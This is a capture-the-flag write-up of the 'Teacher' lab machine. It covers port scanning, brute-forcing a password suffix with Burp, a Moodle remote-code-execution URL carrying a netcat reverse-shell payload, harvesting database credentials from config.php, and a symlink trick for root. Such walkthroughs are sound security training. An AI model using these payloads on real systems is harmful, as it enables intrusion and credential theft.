# Teacher
### Info:
OS: Linux<br>
IP: 10.10.10.153<br>
Difficulty : Easy<br>
### Enumeration:
```
nmap -sC -sV -oA nmap 10.10.10.53
``` 
gives us the results : <br>
```
root@kali:~/Desktop/boxes/Teacher# cat nmap.nmap 
# Nmap 7.70 scan initiated Wed Mar  6 12:33:46 2019 as: nmap -sC -sV -oA nmap 10.10.10.153
Nmap scan report for 10.10.10.153
Host is up (0.43s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  6 12:34:07 2019 -- 1 IP address (1 host up) scanned in 20.83 seconds
```
As we see post 80, running dirbuster :
![alt text](https://i.imgur.com/nUvKvgW.png) <br>
In images we find `5.png` which contained:
![alt text](https://i.imgur.com/d6U8rkR.png) <br>
Using this we get the starting password and now we need the last digit. <br>
By python we create a wordlist containing all the possible combinations
```
root@kali:~/Desktop/boxes/Teacher# cat pass.py 
for i in  range(32,126):
    key= chr(i)
    print "Th4C00lTheacha"+key
```
and now using this wordlist via list based sniper attack via burp:
![alt text](https://i.imgur.com/pEGwAGQ.png) <br>
We get that the password is `Th4C00lTheacha#` for the username `giovanni`
<br>
### Exploitation:
Now in the question tab we find an RCE  <br>
Resource : https://blog.ripstech.com/2018/moodle-remote-code-execution/ <br>
And then running :
```
10.10.10.153/moodle/question/question.php?returnurl=/question/edit.php?courseid=
2&appendqnumstring&scrollpos=0&id=5&wizardnow=datasetitems&courseid=2&0=r
m+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+<your
ip>+<your port>+>/tmp/f
```
spawns a www-data shell for us.
<br>
### Privilege Escalation (User):
First of all making the 
Running LinEnum.sh we get : 
![alt text](https://i.imgur.com/gbT4VDb.png) <br>
Seeing MariaDb with Sql means to look for creds somewhere. <br>
Looking into `/var/www/html/moodle/config.php` we get the SQl creds.
![alt text](https://i.imgur.com/jvZ1Fsl.png) <br>
After login we choose the moodle db and we get : 
![alt text](https://i.imgur.com/YBRsWnA.png) <br>
Now we can crack this hash received which equals `expelled` . <br>
By `su giovanni` and entering the pass we get user.
<br>
### Privilege Escalation (Root):
There were 2 folders inside work, tmp and courses. <br>
Tmp had the backup created every now and then from the courses folder. <br>
Via `ln -s /root/ courses` we create a symbolic link and it means that as soon as the folder gets backed up, <br>
it also backup the contents of root.txt <br>
Therefore as soon as a new backup is created and we open it via `tar -xvf backup.tar.gz` we get our root.txt <br>
The root shell can be achieved via : https://youtu.be/5wyvpJa9LdU (see root privesc)
### Gained knowledge:
Moodle RCE <br>
Burp Sniper Attack <br>
Symbolic Link Creation <br>
